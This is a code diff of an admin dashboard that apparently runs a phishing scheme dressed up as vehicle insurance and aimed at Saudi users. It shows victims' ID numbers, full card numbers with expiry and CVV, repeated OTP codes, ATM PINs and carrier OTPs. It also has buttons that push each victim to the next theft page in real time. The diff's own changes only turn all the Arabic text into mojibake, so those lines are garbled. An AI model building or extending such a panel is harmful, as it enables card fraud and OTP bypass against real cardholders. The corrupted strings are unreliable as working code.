@@ -1,4 +1,4 @@
-﻿import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
+Ã¯Â»Â¿import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
 import { useLocation } from "wouter";
 import { getToken, logoutAdmin } from "@/lib/auth";
 import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getTrackedSessions, type SessionTrackingInfo } from "@/lib/api";
@@ -47,10 +47,10 @@ function parseData(raw: string | null): Record<string, string> {
 function formatAgo(iso: string) {
   const diff = Date.now() - new Date(iso).getTime();
   const secs = Math.floor(diff / 1000);
-  if (secs < 60) return `${secs}ث`;
+  if (secs < 60) return `${secs}ÃÂ«`;
   const mins = Math.floor(secs / 60);
-  if (mins < 60) return `${mins}د`;
-  return `${Math.floor(mins / 60)}س`;
+  if (mins < 60) return `${mins}ÃÂ¯`;
+  return `${Math.floor(mins / 60)}ÃÂ³`;
 }
 
 function formatTimeCounter(iso: string) {
@@ -58,31 +58,31 @@ function formatTimeCounter(iso: string) {
   const secs = Math.floor(diff / 1000);
   
   if (secs < 60) {
-    return `منذ ${secs} ثانية`;
+    return `ÃÂÃÂÃÂ° ${secs} ÃÂ«ÃÂ§ÃÂÃÂÃÂ©`;
   }
   
   const mins = Math.floor(secs / 60);
   if (mins < 60) {
     const remainingSecs = secs % 60;
-    return `منذ ${mins} دقيقة${remainingSecs > 0 ? ` و ${remainingSecs} ثانية` : ""}`;
+    return `ÃÂÃÂÃÂ° ${mins} ÃÂ¯ÃÂÃÂÃÂÃÂ©${remainingSecs > 0 ? ` ÃÂ ${remainingSecs} ÃÂ«ÃÂ§ÃÂÃÂÃÂ©` : ""}`;
   }
   
   const hours = Math.floor(mins / 60);
   if (hours < 24) {
     const remainingMins = mins % 60;
-    return `منذ ${hours} ساعة${remainingMins > 0 ? ` و ${remainingMins} دقيقة` : ""}`;
+    return `ÃÂÃÂÃÂ° ${hours} ÃÂ³ÃÂ§ÃÂ¹ÃÂ©${remainingMins > 0 ? ` ÃÂ ${remainingMins} ÃÂ¯ÃÂÃÂÃÂÃÂ©` : ""}`;
   }
   
   const days = Math.floor(hours / 24);
   if (days < 7) {
     const remainingHours = hours % 24;
-    return `منذ ${days} يوم${remainingHours > 0 ? ` و ${remainingHours} ساعة` : ""}`;
+    return `ÃÂÃÂÃÂ° ${days} ÃÂÃÂÃÂ${remainingHours > 0 ? ` ÃÂ ${remainingHours} ÃÂ³ÃÂ§ÃÂ¹ÃÂ©` : ""}`;
   }
   
   const weeks = Math.floor(days / 7);
   if (weeks < 4) {
     const remainingDays = days % 7;
-    return `منذ ${weeks} اسبوع${remainingDays > 0 ? ` و ${remainingDays} يوم` : ""}`;
+    return `ÃÂÃÂÃÂ° ${weeks} ÃÂ§ÃÂ³ÃÂ¨ÃÂÃÂ¹${remainingDays > 0 ? ` ÃÂ ${remainingDays} ÃÂÃÂÃÂ` : ""}`;
   }
   
   // For older records, show actual date
@@ -92,16 +92,16 @@ function formatTimeCounter(iso: string) {
 
 function getTypeArabic(type: string): string {
   const typeMap: Record<string, string> = {
-    "initial": "البيانات الشخصية",
-    "vehicle": "بيانات المركبة",
-    "payment": "الدفع",
-    "card": "بيانات البطاقة",
-    "atm": "صراف ATM",
-    "nomer": "رقم الحساب",
-    "nomer_otp": "OTP رقم الحساب",
-    "otp_attempt_1": "رمز التحقق (محاولة 1)",
-    "otp_attempt_2": "رمز التحقق (محاولة 2)",
-    "otp_attempt_3": "رمز التحقق (محاولة 3)",
+    "initial": "ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ´ÃÂ®ÃÂµÃÂÃÂ©",
+    "vehicle": "ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©",
+    "payment": "ÃÂ§ÃÂÃÂ¯ÃÂÃÂ¹",
+    "card": "ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©",
+    "atm": "ÃÂµÃÂ±ÃÂ§ÃÂ ATM",
+    "nomer": "ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ­ÃÂ³ÃÂ§ÃÂ¨",
+    "nomer_otp": "OTP ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ­ÃÂ³ÃÂ§ÃÂ¨",
+    "otp_attempt_1": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 1)",
+    "otp_attempt_2": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 2)",
+    "otp_attempt_3": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 3)",
   };
   return typeMap[type] || type.toUpperCase();
 }
@@ -119,7 +119,7 @@ function StatCard({ label, value, icon, color, onClick }: { label: string; value
         <span className="text-3xl font-bold text-slate-900">{value}</span>
       </div>
       <p className="text-xs text-slate-500">{label}</p>
-      {onClick && <p className="text-xs text-blue-500 mt-2">انقر للتفاصيل</p>}
+      {onClick && <p className="text-xs text-blue-500 mt-2">ÃÂ§ÃÂÃÂÃÂ± ÃÂÃÂÃÂªÃÂÃÂ§ÃÂµÃÂÃÂ</p>}
     </button>
   );
 }
@@ -134,7 +134,7 @@ function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: Su
     <Dialog open onOpenChange={(value) => !value && onClose()}>
       <DialogContent className="sm:max-w-[760px] max-h-[85vh] flex flex-col" dir="rtl">
         <DialogHeader>
-          <DialogTitle>سجل الجلسة</DialogTitle>
+          <DialogTitle>ÃÂ³ÃÂ¬ÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ©</DialogTitle>
         </DialogHeader>
         <ScrollArea className="flex-1 mt-4">
           <div className="space-y-4">
@@ -154,8 +154,8 @@ function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: Su
                       </div>
                     ))}
                     <div className="rounded-2xl bg-slate-50 p-3 text-[11px] text-slate-500">
-                      <div>IP: {row.ipAddress ?? "غير معروف"}</div>
-                      <div>المستخدم: {row.userAgent ?? "غير معروف"}</div>
+                      <div>IP: {row.ipAddress ?? "ÃÂºÃÂÃÂ± ÃÂÃÂ¹ÃÂ±ÃÂÃÂ"}</div>
+                      <div>ÃÂ§ÃÂÃÂÃÂ³ÃÂªÃÂ®ÃÂ¯ÃÂ: {row.userAgent ?? "ÃÂºÃÂÃÂ± ÃÂÃÂ¹ÃÂ±ÃÂÃÂ"}</div>
                     </div>
                   </div>
                 </div>
@@ -171,23 +171,23 @@ function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: Su
 // Page Arabic names mapping
 function getPageArabic(page: string): string {
   const pageMap: Record<string, string> = {
-    "/": "الصفحة الرئيسية",
-    "/form": "بيانات المركبة",
-    "/select": "اختيار الباقة",
-    "/total": "ملخص التكلفة",
-    "/total2": "تأكيد التكلفة",
-    "/visa": "الدفع بالبطاقة",
-    "/otp": "رمز التحقق",
-    "/otp2": "رمز التحقق (محاولة 2)",
-    "/otp3": "رمز التحقق (محاولة 3)",
-    "/atm": "صراف ATM",
-    "/nomer": "رقم الحساب",
-    "/nomer-wait": "انتظار التحقق",
-    "/nomer-otp": "رمز التحقق للحساب",
-    "/identity-check": "التحقق من الهوية",
-    "/waiting": "قائمة الانتظار",
+    "/": "ÃÂ§ÃÂÃÂµÃÂÃÂ­ÃÂ© ÃÂ§ÃÂÃÂ±ÃÂ¦ÃÂÃÂ³ÃÂÃÂ©",
+    "/form": "ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©",
+    "/select": "ÃÂ§ÃÂ®ÃÂªÃÂÃÂ§ÃÂ± ÃÂ§ÃÂÃÂ¨ÃÂ§ÃÂÃÂ©",
+    "/total": "ÃÂÃÂÃÂ®ÃÂµ ÃÂ§ÃÂÃÂªÃÂÃÂÃÂÃÂ©",
+    "/total2": "ÃÂªÃÂ£ÃÂÃÂÃÂ¯ ÃÂ§ÃÂÃÂªÃÂÃÂÃÂÃÂ©",
+    "/visa": "ÃÂ§ÃÂÃÂ¯ÃÂÃÂ¹ ÃÂ¨ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©",
+    "/otp": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ",
+    "/otp2": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 2)",
+    "/otp3": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 3)",
+    "/atm": "ÃÂµÃÂ±ÃÂ§ÃÂ ATM",
+    "/nomer": "ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ­ÃÂ³ÃÂ§ÃÂ¨",
+    "/nomer-wait": "ÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ± ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ",
+    "/nomer-otp": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂÃÂ­ÃÂ³ÃÂ§ÃÂ¨",
+    "/identity-check": "ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©",
+    "/waiting": "ÃÂÃÂ§ÃÂ¦ÃÂÃÂ© ÃÂ§ÃÂÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ±",
   };
-  return pageMap[page] || page || "غير معروف";
+  return pageMap[page] || page || "ÃÂºÃÂÃÂ± ÃÂÃÂ¹ÃÂ±ÃÂÃÂ";
 }
 
 function SessionBox({
@@ -224,8 +224,8 @@ function SessionBox({
   // Rows are already sorted by ID DESC (newest first) from parent useMemo
   const initialRow = rows.find((row) => row.type === "initial");
   const initialData = parseData(initialRow?.data ?? null);
-  const name = initialData.ownerName || "مستخدم";
-  const phone = initialData.phone || "بدون هاتف";
+  const name = initialData.ownerName || "ÃÂÃÂ³ÃÂªÃÂ®ÃÂ¯ÃÂ";
+  const phone = initialData.phone || "ÃÂ¨ÃÂ¯ÃÂÃÂ ÃÂÃÂ§ÃÂªÃÂ";
   const cardRows = rows.filter((row) => row.type === "card");
   // Use FIRST card (newest) since rows are sorted by ID desc
   const latestCard = cardRows[0];
@@ -238,16 +238,16 @@ function SessionBox({
   const lastActivity = rows[0]?.createdAt;
 
   const statusBadge = blocked
-    ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">محظور</Badge>
+    ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">ÃÂÃÂ­ÃÂ¸ÃÂÃÂ±</Badge>
     : otpRows.length > 0
-      ? <Badge className="bg-green-100 text-green-700 border-green-200 text-[10px]">OTP ✓</Badge>
+      ? <Badge className="bg-green-100 text-green-700 border-green-200 text-[10px]">OTP Ã¢ÂÂ</Badge>
       : cardRows.length > 0
-        ? <Badge className="bg-orange-100 text-orange-700 border-orange-200 text-[10px] animate-pulse">ينتظر</Badge>
-        : <Badge variant="outline" className="text-slate-400 text-[10px]">بيانات فقط</Badge>;
+        ? <Badge className="bg-orange-100 text-orange-700 border-orange-200 text-[10px] animate-pulse">ÃÂÃÂÃÂªÃÂ¸ÃÂ±</Badge>
+        : <Badge variant="outline" className="text-slate-400 text-[10px]">ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂÃÂÃÂ·</Badge>;
 
   const formattedCard = latestCard && cardData.cardNumber
     ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
-    : "—";
+    : "Ã¢ÂÂ";
 
   useEffect(() => {
     setExpanded(cardRows.length > 0 || otpRows.length > 0);
@@ -285,11 +285,11 @@ function SessionBox({
                     <p className="text-xs text-slate-500" dir="ltr">{phone}</p>
                     {/* Current Page */}
                     <p className="text-[10px] text-blue-600 font-medium">
-                      📍 {getPageArabic(currentPage || "")}
+                      Ã°ÂÂÂ {getPageArabic(currentPage || "")}
                     </p>
                   </div>
                   <div className="flex items-center gap-2 text-xs text-slate-500">
-                    <span dir="ltr">{lastActivity ? formatAgo(lastActivity) : "—"}</span>
+                    <span dir="ltr">{lastActivity ? formatAgo(lastActivity) : "Ã¢ÂÂ"}</span>
                     {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </div>
                 </div>
@@ -306,48 +306,48 @@ function SessionBox({
               type="button"
               onClick={blocked ? onUnblock : onBlock}
               className={`rounded-2xl px-3 py-2 text-xs font-semibold ${blocked ? "border border-green-200 bg-green-50 text-green-700 hover:bg-green-100" : "border border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100"}`}
-            >{blocked ? "رفع الحظر" : "حظر"}</button>
+            >{blocked ? "ÃÂ±ÃÂÃÂ¹ ÃÂ§ÃÂÃÂ­ÃÂ¸ÃÂ±" : "ÃÂ­ÃÂ¸ÃÂ±"}</button>
             <button
               type="button"
               onClick={onDelete}
               className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
-            >سلة المهملات</button>
+            >ÃÂ³ÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</button>
           </div>
         </div>
 
         {expanded && (
           <div className="mt-4 space-y-4 border-t border-slate-100 pt-4">
-            {/* صندوق البيانات المركبة */}
+            {/* ÃÂµÃÂÃÂ¯ÃÂÃÂ ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ© */}
             <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
-              <p className="text-xs font-semibold text-slate-500 mb-3">البيانات المركبة</p>
+              <p className="text-xs font-semibold text-slate-500 mb-3">ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©</p>
               
-              {/* البيانات الشخصية */}
+              {/* ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ´ÃÂ®ÃÂµÃÂÃÂ© */}
               <div className="mb-4">
-                <p className="text-[10px] text-slate-400 mb-2">البيانات الشخصية</p>
+                <p className="text-[10px] text-slate-400 mb-2">ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ´ÃÂ®ÃÂµÃÂÃÂ©</p>
                 <div className="grid gap-2 sm:grid-cols-2 text-xs">
-                  <div className="rounded-xl bg-white p-2">الاسم: <span className="font-semibold">{name}</span></div>
-                  <div className="rounded-xl bg-white p-2">الهاتف: <span className="font-semibold" dir="ltr">{phone}</span></div>
-                  <div className="rounded-xl bg-white p-2">رقم الهوية: <span className="font-semibold" dir="ltr">{initialData.idNumber ?? "—"}</span></div>
-                  <div className="rounded-xl bg-white p-2">نوع التامين: <span className="font-semibold">{initialData.insuranceType ?? "—"}</span></div>
+                  <div className="rounded-xl bg-white p-2">ÃÂ§ÃÂÃÂ§ÃÂ³ÃÂ: <span className="font-semibold">{name}</span></div>
+                  <div className="rounded-xl bg-white p-2">ÃÂ§ÃÂÃÂÃÂ§ÃÂªÃÂ: <span className="font-semibold" dir="ltr">{phone}</span></div>
+                  <div className="rounded-xl bg-white p-2">ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©: <span className="font-semibold" dir="ltr">{initialData.idNumber ?? "Ã¢ÂÂ"}</span></div>
+                  <div className="rounded-xl bg-white p-2">ÃÂÃÂÃÂ¹ ÃÂ§ÃÂÃÂªÃÂ§ÃÂÃÂÃÂ: <span className="font-semibold">{initialData.insuranceType ?? "Ã¢ÂÂ"}</span></div>
                 </div>
               </div>
 
-              {/* بيانات البطاقة */}
+              {/* ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ© */}
               {latestCard ? (
                 <div>
-                  <p className="text-[10px] text-slate-400 mb-2">بيانات البطاقة</p>
+                  <p className="text-[10px] text-slate-400 mb-2">ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©</p>
                   <div className="grid gap-2 sm:grid-cols-2 text-xs">
                     <div className="rounded-xl bg-white p-2 sm:col-span-2">
-                      رقم البطاقة: <span className="font-mono font-semibold" dir="ltr">{formattedCard}</span>
+                      ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©: <span className="font-mono font-semibold" dir="ltr">{formattedCard}</span>
                     </div>
-                    <div className="rounded-xl bg-white p-2">المالك: <span className="font-semibold">{cardData.cardHolder ?? "—"}</span></div>
-                    <div className="rounded-xl bg-white p-2">تاريخ الانتهاء: <span className="font-semibold" dir="ltr">{cardData.expiry ?? "—"}</span></div>
-                    <div className="rounded-xl bg-white p-2">CVV: <span className="font-semibold" dir="ltr">{cardData.cvv ?? "—"}</span></div>
+                    <div className="rounded-xl bg-white p-2">ÃÂ§ÃÂÃÂÃÂ§ÃÂÃÂ: <span className="font-semibold">{cardData.cardHolder ?? "Ã¢ÂÂ"}</span></div>
+                    <div className="rounded-xl bg-white p-2">ÃÂªÃÂ§ÃÂ±ÃÂÃÂ® ÃÂ§ÃÂÃÂ§ÃÂÃÂªÃÂÃÂ§ÃÂ¡: <span className="font-semibold" dir="ltr">{cardData.expiry ?? "Ã¢ÂÂ"}</span></div>
+                    <div className="rounded-xl bg-white p-2">CVV: <span className="font-semibold" dir="ltr">{cardData.cvv ?? "Ã¢ÂÂ"}</span></div>
                   </div>
                 </div>
               ) : (
                 <div className="rounded-3xl border border-dashed border-slate-300 bg-white p-3 text-xs text-slate-500 text-center">
-                  لا توجد بطاقة حتى الآن
+                  ÃÂÃÂ§ ÃÂªÃÂÃÂ¬ÃÂ¯ ÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ© ÃÂ­ÃÂªÃÂ ÃÂ§ÃÂÃÂ¢ÃÂ
                 </div>
               )}
             </div>
@@ -355,8 +355,8 @@ function SessionBox({
             {otpRows.length > 0 && (
               <div className="rounded-3xl border border-slate-200 bg-white p-4">
                 <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
-                  <span>رموز OTP</span>
-                  <span>{otpRows.length} رمز</span>
+                  <span>ÃÂ±ÃÂÃÂÃÂ² OTP</span>
+                  <span>{otpRows.length} ÃÂ±ÃÂÃÂ²</span>
                 </div>
                 <div className="space-y-2">
                   {otpRows.map((otp, index) => {
@@ -364,10 +364,10 @@ function SessionBox({
                     return (
                       <div key={otp.id} className="rounded-2xl bg-green-50 p-3 text-xs text-slate-700">
                         <div className="flex items-center justify-between gap-3 mb-2">
-                          <span className="font-semibold text-green-700">محاولة {index + 1}</span>
+                          <span className="font-semibold text-green-700">ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© {index + 1}</span>
                           <span className="text-slate-500" dir="ltr">{formatAgo(otp.createdAt)}</span>
                         </div>
-                        <div className="font-mono text-base font-bold text-green-900" dir="ltr">{data.otpCode ?? "—"}</div>
+                        <div className="font-mono text-base font-bold text-green-900" dir="ltr">{data.otpCode ?? "Ã¢ÂÂ"}</div>
                       </div>
                     );
                   })}
@@ -378,52 +378,52 @@ function SessionBox({
             {atmRows.length > 0 && (
               <div className="rounded-3xl border border-slate-200 bg-white p-4 text-xs text-slate-700">
                 <div className="flex items-center justify-between mb-3 text-slate-500">
-                  <span>بيانات ATM</span>
+                  <span>ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ATM</span>
                 </div>
                 {atmRows.map((atm) => {
                   const data = parseData(atm.data);
                   return (
                     <div key={atm.id} className="rounded-2xl bg-slate-50 p-3 mb-2">
                       <div className="flex items-center justify-between text-slate-500 text-[11px] mb-1">
-                        <span>رمز ATM</span>
+                        <span>ÃÂ±ÃÂÃÂ² ATM</span>
                         <span dir="ltr">{formatAgo(atm.createdAt)}</span>
                       </div>
-                      <div className="font-mono font-semibold">{data.atmCode ?? "—"}</div>
+                      <div className="font-mono font-semibold">{data.atmCode ?? "Ã¢ÂÂ"}</div>
                     </div>
                   );
                 })}
               </div>
             )}
 
-            {/* بيانات رقم الجوال */}
+            {/* ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ */}
             {nomerRows.length > 0 && (
               <div className="rounded-3xl border border-blue-200 bg-blue-50 p-4">
                 <div className="flex items-center justify-between text-xs font-semibold text-blue-700 mb-3">
-                  <span>بيانات رقم الجوال</span>
-                  <span>{nomerRows.length} إدخال</span>
+                  <span>ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ</span>
+                  <span>{nomerRows.length} ÃÂ¥ÃÂ¯ÃÂ®ÃÂ§ÃÂ</span>
                 </div>
                 {nomerRows.map((nomer) => {
                   const data = parseData(nomer.data);
                   const providerNames: Record<string, string> = {
                     stc: "STC",
-                    mobily: "موبايلي",
-                    zain: "زين",
-                    jawra: "جوال"
+                    mobily: "ÃÂÃÂÃÂ¨ÃÂ§ÃÂÃÂÃÂ",
+                    zain: "ÃÂ²ÃÂÃÂ",
+                    jawra: "ÃÂ¬ÃÂÃÂ§ÃÂ"
                   };
                   return (
                     <div key={nomer.id} className="rounded-2xl bg-white p-3 mb-2">
                       <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
-                        <span>إدخال رقم الجوال</span>
+                        <span>ÃÂ¥ÃÂ¯ÃÂ®ÃÂ§ÃÂ ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ</span>
                         <span dir="ltr">{formatAgo(nomer.createdAt)}</span>
                       </div>
                       <div className="space-y-1 text-xs">
                         <div className="flex justify-between">
-                          <span className="text-slate-500">مزود الخدمة:</span>
-                          <span className="font-semibold">{providerNames[data.provider] ?? data.provider ?? "—"}</span>
+                          <span className="text-slate-500">ÃÂÃÂ²ÃÂÃÂ¯ ÃÂ§ÃÂÃÂ®ÃÂ¯ÃÂÃÂ©:</span>
+                          <span className="font-semibold">{providerNames[data.provider] ?? data.provider ?? "Ã¢ÂÂ"}</span>
                         </div>
                         <div className="flex justify-between">
-                          <span className="text-slate-500">رقم الجوال:</span>
-                          <span className="font-mono font-semibold" dir="ltr">{data.phone ?? "—"}</span>
+                          <span className="text-slate-500">ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ:</span>
+                          <span className="font-mono font-semibold" dir="ltr">{data.phone ?? "Ã¢ÂÂ"}</span>
                         </div>
                       </div>
                     </div>
@@ -432,12 +432,12 @@ function SessionBox({
               </div>
             )}
 
-            {/* رمز تحقق رقم الجوال */}
+            {/* ÃÂ±ÃÂÃÂ² ÃÂªÃÂ­ÃÂÃÂ ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ */}
             {nomerOtpRows.length > 0 && (
               <div className="rounded-3xl border border-green-200 bg-green-50 p-4">
                 <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
-                  <span>رمز تحقق رقم الجوال</span>
-                  <span>{nomerOtpRows.length} رمز</span>
+                  <span>ÃÂ±ÃÂÃÂ² ÃÂªÃÂ­ÃÂÃÂ ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ</span>
+                  <span>{nomerOtpRows.length} ÃÂ±ÃÂÃÂ²</span>
                 </div>
                 <div className="space-y-2">
                   {nomerOtpRows.map((otp, index) => {
@@ -445,11 +445,11 @@ function SessionBox({
                     return (
                       <div key={otp.id} className="rounded-2xl bg-white p-3">
                         <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
-                          <span>محاولة {index + 1}</span>
+                          <span>ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© {index + 1}</span>
                           <span dir="ltr">{formatAgo(otp.createdAt)}</span>
                         </div>
                         <div className="font-mono text-base font-bold text-green-900 text-center" dir="ltr">
-                          {data.otpCode ?? "—"}
+                          {data.otpCode ?? "Ã¢ÂÂ"}
                         </div>
                       </div>
                     );
@@ -458,14 +458,14 @@ function SessionBox({
               </div>
             )}
 
-            {/* التحقق من الهوية */}
+            {/* ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ© */}
             <div className="rounded-3xl border border-purple-200 bg-purple-50 p-4">
-              <div className="text-xs font-semibold text-purple-700 mb-3">التحقق من الهوية</div>
+              <div className="text-xs font-semibold text-purple-700 mb-3">ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©</div>
               <div className="flex gap-2">
                 <input
                   type="text"
                   id={`identity-code-${sessionId}`}
-                  placeholder="رقم التحقق (مثل: 5)"
+                  placeholder="ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ«ÃÂ: 5)"
                   className="flex-1 rounded-2xl border border-purple-200 bg-white px-4 py-2 text-sm text-center font-mono focus:border-purple-400 focus:outline-none focus:ring-2 focus:ring-purple-100"
                   maxLength={10}
                 />
@@ -486,94 +486,94 @@ function SessionBox({
                   }}
                   className="rounded-2xl bg-purple-600 px-4 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
                 >
-                  {loadingAction === "identity_code" ? "جارٍ..." : "إرسال"}
+                  {loadingAction === "identity_code" ? "ÃÂ¬ÃÂ§ÃÂ±ÃÂ..." : "ÃÂ¥ÃÂ±ÃÂ³ÃÂ§ÃÂ"}
                 </button>
               </div>
-              <p className="mt-2 text-[10px] text-purple-600">أدخل رقم أو نص ليظهر للعميل فوراً</p>
+              <p className="mt-2 text-[10px] text-purple-600">ÃÂ£ÃÂ¯ÃÂ®ÃÂ ÃÂ±ÃÂÃÂ ÃÂ£ÃÂ ÃÂÃÂµ ÃÂÃÂÃÂ¸ÃÂÃÂ± ÃÂÃÂÃÂ¹ÃÂÃÂÃÂ ÃÂÃÂÃÂ±ÃÂ§ÃÂ</p>
             </div>
 
-            {/* أزرار التحكم */}
+            {/* ÃÂ£ÃÂ²ÃÂ±ÃÂ§ÃÂ± ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ */}
             <div className="space-y-3">
-              <p className="text-[10px] text-slate-400 font-semibold">إعادة التوجيه</p>
+              <p className="text-[10px] text-slate-400 font-semibold">ÃÂ¥ÃÂ¹ÃÂ§ÃÂ¯ÃÂ© ÃÂ§ÃÂÃÂªÃÂÃÂ¬ÃÂÃÂ</p>
               <div className="grid gap-2 sm:grid-cols-2">
                 <button
                   type="button"
                   disabled={loadingAction === "go_home"}
                   onClick={() => void handleControl("go_home")}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_home" ? "...جارٍ" : "🏠 الرئيسية"}</button>
+                >{loadingAction === "go_home" ? "...ÃÂ¬ÃÂ§ÃÂ±ÃÂ" : "Ã°ÂÂÂ  ÃÂ§ÃÂÃÂ±ÃÂ¦ÃÂÃÂ³ÃÂÃÂ©"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_form"}
                   onClick={() => void handleControl("go_form")}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_form" ? "...جارٍ" : "📝 بيانات المركبة"}</button>
+                >{loadingAction === "go_form" ? "...ÃÂ¬ÃÂ§ÃÂ±ÃÂ" : "Ã°ÂÂÂ ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_select"}
                   onClick={() => void handleControl("go_select")}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_select" ? "...جارٍ" : "🏢 اختيار التأمين"}</button>
+                >{loadingAction === "go_select" ? "...ÃÂ¬ÃÂ§ÃÂ±ÃÂ" : "Ã°ÂÂÂ¢ ÃÂ§ÃÂ®ÃÂªÃÂÃÂ§ÃÂ± ÃÂ§ÃÂÃÂªÃÂ£ÃÂÃÂÃÂ"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_visa"}
